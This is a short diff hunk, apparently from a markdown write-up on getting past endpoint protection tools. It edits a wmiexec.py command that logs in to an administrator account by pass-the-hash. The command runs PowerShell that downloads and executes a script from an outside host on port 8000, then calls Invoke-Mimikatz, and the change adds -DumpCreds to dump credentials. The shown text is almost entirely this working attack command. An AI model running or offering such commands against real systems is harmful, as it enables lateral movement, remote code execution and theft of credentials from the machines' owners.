@@ -60,7 +60,7 @@ endpoint protection tools:
 ```
 wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
     ./administrator@10.0.1.4  \
-    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/ps\"); Load-Hubmodule 11 ; Invoke-Mimikatz "'
+    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/ps\"); Load-Hubmodule 11 ; Invoke-Mimikatz -DumpCreds "'
 ```
 
 Author
